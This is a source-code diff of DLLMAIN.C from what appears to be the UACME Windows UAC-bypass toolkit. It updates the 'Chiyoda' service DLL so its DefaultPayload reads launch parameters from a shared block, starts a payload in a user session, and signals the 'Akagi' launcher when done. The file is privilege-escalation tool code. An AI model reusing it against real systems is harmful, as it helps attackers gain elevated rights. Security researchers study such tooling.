@@ -4,9 +4,9 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.03
+*  VERSION:     3.10
 *
-*  DATE:        11 Oct 2018
+*  DATE:        11 Nov 2018
 *
 *  Chiyoda entry point.
 *
@@ -63,6 +63,8 @@ static const WCHAR g_svcImagePath[]             = { L"ImagePath" };
 static const WCHAR g_svcRequiredPrivileges[]    = { L"RequiredPrivileges" };
 static const WCHAR g_svcObjectName[]            = { L"ObjectName" };
 static const WCHAR g_svcServiceDll[]            = { L"ServiceDll" };
+
+UACME_PARAM_BLOCK g_SharedParams;
 
 
 /*
@@ -206,21 +208,30 @@ VOID DefaultPayload(
     VOID
 )
 {
-    BOOL bReadSuccess;
-    PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
-    ULONG SessionId = 0;
+    BOOL bSharedParamsReadOk;
+    PWSTR lpParameter;
+    ULONG cbParameter;
+    ULONG SessionId;
 
 #ifdef _TRACE_CALL
     WCHAR szDebug[100];
 #endif
 
-    bReadSuccess = ucmReadParameters(
-        &lpParameter,
-        &cbParameter,
-        NULL,
-        &SessionId,
-        TRUE);
+    //
+    // Read shared params block.
+    //
+    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+    if (bSharedParamsReadOk) {
+        lpParameter = g_SharedParams.szParameter;
+        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+        SessionId = g_SharedParams.SessionId;
+    }
+    else {
+        lpParameter = NULL;
+        cbParameter = 0UL;
+        SessionId = 0;
+    }
 
 #ifdef _TRACE_CALL
     _strcpy(szDebug, L"service>>SessionId=");
@@ -229,23 +240,23 @@ VOID DefaultPayload(
 #endif
 
     ucmLaunchPayload2(
-        TRUE,
+        TRUE, //because we are running as service
         SessionId,
         lpParameter,
         cbParameter);
-
-    if (bReadSuccess) {
-        RtlFreeHeap(
-            NtCurrentPeb()->ProcessHeap,
-            0,
-            lpParameter);
-    }
 
 #ifdef _TRACE_CALL
     OutputDebugString(L"service>>pingback\r\n");
 #endif
 
     ucmPingBack();
+
+    //
+    // Notify Akagi.
+    //
+    if (bSharedParamsReadOk) {
+        ucmSetCompletion(g_SharedParams.szSignalObject);
+    }
 
 #ifdef _TRACE_CALL
     OutputDebugString(L"service>>stopping\r\n");
